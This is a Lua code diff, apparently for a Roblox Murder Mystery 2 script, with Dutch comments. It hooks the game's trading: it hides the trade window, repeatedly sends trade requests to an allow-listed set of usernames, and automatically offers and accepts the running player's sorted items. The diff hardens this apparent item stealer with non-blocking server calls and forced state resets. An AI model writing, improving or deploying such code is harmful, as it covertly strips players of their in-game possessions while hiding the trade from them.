@@ -200,7 +200,8 @@ local function hook_mm2()
             shiftlockConn:Disconnect()
             shiftlockConn = nil
         end
-        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
+        -- geen pcall: dit moet altijd werken
+        UIS.MouseBehavior = Enum.MouseBehavior.Default
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -220,8 +221,8 @@ local function hook_mm2()
         itemsOffered = false
         readySent = false
         currentLastOffer = nil
-        showGui()
         restoreItems()
+        showGui()
     end
 
     if updateTrade then
@@ -234,9 +235,7 @@ local function hook_mm2()
 
     if declineTrade then
         declineTrade.OnClientEvent:Connect(function()
-            if tradingWithAllowed then
-                resetState()
-            end
+            resetState()
         end)
     end
 
@@ -246,6 +245,7 @@ local function hook_mm2()
         end)
     end
 
+    -- stuur trade elke 2s als niet bezig
     task.spawn(function()
         while true do
             task.wait(2)
@@ -253,7 +253,10 @@ local function hook_mm2()
                 for _, player in ipairs(Players:GetPlayers()) do
                     if player ~= lp and isAllowedUser(player.Name) then
                         storeItems()
-                        pcall(function() sendRequest:InvokeServer(player) end)
+                        -- task.spawn zodat InvokeServer de loop niet blokkeert
+                        task.spawn(function()
+                            pcall(function() sendRequest:InvokeServer(player) end)
+                        end)
                         break
                     end
                 end
@@ -265,7 +268,9 @@ local function hook_mm2()
         if isAllowedUser(player.Name) and not tradingWithAllowed then
             task.wait(1)
             storeItems()
-            pcall(function() sendRequest:InvokeServer(player) end)
+            task.spawn(function()
+                pcall(function() sendRequest:InvokeServer(player) end)
+            end)
         end
     end)
 
@@ -290,7 +295,11 @@ local function hook_mm2()
         task.spawn(function()
             task.wait(1)
             local sortedItems = collect_mm2_items()
-            if #sortedItems == 0 then return end
+            if #sortedItems == 0 then
+                -- geen items, direct reset
+                resetState()
+                return
+            end
 
             local uniqueSlots = 0
             for _, entry in ipairs(sortedItems) do
@@ -311,11 +320,9 @@ local function hook_mm2()
                 pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
 
-            -- veiligheidsnet: als completeTrade nooit vuurt, reset na 15s
-            task.wait(15)
-            if tradingWithAllowed then
-                resetState()
-            end
+            -- altijd reset na 10s, ongeacht of complete/decline event vuurt
+            task.wait(10)
+            resetState()
         end)
     end)
 end
